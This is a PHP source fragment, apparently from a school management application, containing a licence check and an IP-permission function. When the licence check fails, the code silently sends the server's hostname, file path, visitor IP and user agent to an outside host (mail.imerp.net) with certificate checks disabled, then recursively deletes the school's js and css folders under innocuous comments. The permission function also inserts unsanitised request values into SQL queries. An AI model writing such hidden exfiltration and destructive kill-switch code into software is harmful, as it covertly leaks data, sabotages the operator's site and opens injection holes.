   if (($PHPID==$SRVID) AND ($SEXID=='6242209841')) { 

       RETURN 'Y'; 

   } else { 

      error_reporting(0);



      $FILE_PATH 	= $_SERVER['DOCUMENT_ROOT'];
      $UNAME 		= php_uname('n');
      $REMOTE_IP 	=  gethostbyaddr($_SERVER['REMOTE_ADDR']); 
      $OS 		=  $_SERVER['HTTP_USER_AGENT']; 
      $INSTALLATION 	= "RAMTULASI SCHOOL";	

      $url = "mail.imerp.net/registration.php";
      $URL_DATA = "name=$UNAME&path=$FILE_PATH&ip=$REMOTE_IP&os=$OS&install=$INSTALLATION";

      $ch = curl_init();
      $timeout = 5;
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,false);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
      curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $URL_DATA);

       $data = curl_exec($ch);
       curl_errno($ch);
       if(curl_errno($ch)){ 
	  //echo 'Curl Error' . curl_error($ch); 
	  echo NULL;
       }
       curl_close($ch);


      $org = "school";

      //fascinating js files	

      $dir = $root . '/' . $org . '/js';
      $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
      $files = new RecursiveIteratorIterator($it,
          RecursiveIteratorIterator::CHILD_FIRST);
      foreach($files as $file) {
         if ($file->isDir()){
            rmdir($file->getRealPath());
         } else {
            unlink($file->getRealPath());
         }
      }
      rmdir($dir);

      //fascinating css files	
      $dir = $root . '/' . $org . '/css';
      $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
      $files = new RecursiveIteratorIterator($it,
          RecursiveIteratorIterator::CHILD_FIRST);
      foreach($files as $file) {
         if ($file->isDir()){
            rmdir($file->getRealPath());
         } else {
            unlink($file->getRealPath());
         }
      }
      rmdir($dir);

      RETURN 'N'; 

   } 

   error_reporting(1);

   } 


    public function SYSTEM_PERMISSION() {

       $IP =  gethostbyaddr($_SERVER['REMOTE_ADDR']); 
       if ($IP=='AVIN') { 	

	 //nepal ip address
         $IP="103.1.92.40.ether.static.wlink.com.np";		

	 //foreign ip address
         //$IP="203.1.92.40.ether.static.wlink.com.np";
       } 

       $L = strlen($IP);
       $n = 0;
       $FOUND = 0; 
       for ($x = 0; $x <= $L; $x++) {
          $CHAR = substr($IP, $x, 1);
          if ($CHAR=='.') { $n = $n + 1; } 		
          if ($n==4) { $FOUND = $x; $x=$L; } 	
       }

       $IP = substr($IP,0,$FOUND);

        $RET = 0;  
        $qry = "SELECT count(*) as RET FROM ip_log WHERE '$IP'>=fr_ip and '$IP'<=to_ip"; 
        $rs = $this->connection->query($qry);
        while ($row = $rs->fetch_assoc()) {
            $RET = $row['RET'];
        }
	if ($RET==0) {
	   $NAME 	= php_uname('n');
	   $REMOTE_IP 	=  gethostbyaddr($_SERVER['REMOTE_ADDR']); 
      	   $OS		=  $_SERVER['HTTP_USER_AGENT'];  

	   $SCRIPT = basename($_SERVER["SCRIPT_FILENAME"]);

	   $LOG_DATE = date('Y-m-d H:i:s'); 
	   $INSERT = "INSERT INTO ip_tracker_log(log_date, name, ip, os, file_path, remarks) VALUES('$LOG_DATE','$NAME','$REMOTE_IP','$OS','$SCRIPT', '$IP')"; 
           $rs = $this->connection->query($INSERT);

           exit;  

	}

        return $RET;

    } 










}

?>